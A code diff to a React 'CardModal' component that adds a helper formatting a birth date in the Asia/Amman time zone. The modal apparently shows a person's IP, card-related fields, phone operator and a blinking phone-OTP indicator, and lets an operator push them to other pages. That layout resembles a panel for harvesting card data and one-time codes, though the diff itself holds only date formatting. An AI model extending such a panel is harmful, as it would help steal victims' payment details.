@@ -86,6 +86,18 @@ export default function CardModal({ ip, user, onClose }) {
     setConfirm({ show: true, page });
   };
 
+  const fmtBirthDate = (value) => {
+    if (!value) return "—";
+    const d = new Date(value);
+    if (isNaN(d)) return "—";
+    return new Intl.DateTimeFormat("en-GB", {
+      timeZone: "Asia/Amman",
+      day: "2-digit",
+      month: "2-digit",
+      year: "numeric",
+    }).format(d); // -> "13/10/2025"
+  };
+
   // Hide ConfirmDialog without emitting anything
   const hideConfirm = () => {
     setConfirm({ show: false, page: null });
@@ -286,7 +298,7 @@ export default function CardModal({ ip, user, onClose }) {
                 <strong>Operator:</strong> {operator || "—"}
               </p>
               <p style={{ marginBottom: "0.5rem" }}>
-                <strong>birthDate:</strong> {birthDate || "—"}
+                <strong>birthDate:</strong> {fmtBirthDate(birthDate) || "—"}
               </p>
               <p
                 className={blinkPhoneOtp ? "blink-green-text" : ""}
